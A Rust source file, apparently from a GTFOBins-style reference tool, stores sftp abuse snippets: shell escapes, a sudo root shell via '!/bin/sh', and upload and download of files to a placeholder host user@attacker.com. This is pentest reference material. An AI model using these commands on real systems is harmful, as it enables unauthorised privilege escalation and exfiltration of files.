pub static BIN_NAME: &'static str = "sftp";
pub static SH_CODE: &'static str = r#"
    
    HOST=user@attacker.com
    sftp $HOST
    !/bin/sh
"#;
pub static FU_DESC: &'static str = "Send local file to a SSH server.";
pub static FU_CODE: &'static str = r#"
    
    RHOST=user@attacker.com
    sftp $RHOST
    put file_to_send file_to_save
"#;
pub static FD_DESC: &'static str = "Fetch a remote file from a SSH server.";
pub static FD_CODE: &'static str = r#"
    
    RHOST=user@attacker.com
    sftp $RHOST
    get file_to_get file_to_save
"#;
pub static SUDO_CODE: &'static str = r#"
    
    HOST=user@attacker.com
    sudo sftp $HOST
    !/bin/sh
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static FU: Code<'static> = Code { 
	title: "FU_CODE",
	code: FU_CODE,
	tag: Tag::FU,
};
pub static FD: Code<'static> = Code { 
	title: "FD_CODE",
	code: FD_CODE,
	tag: Tag::FD,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
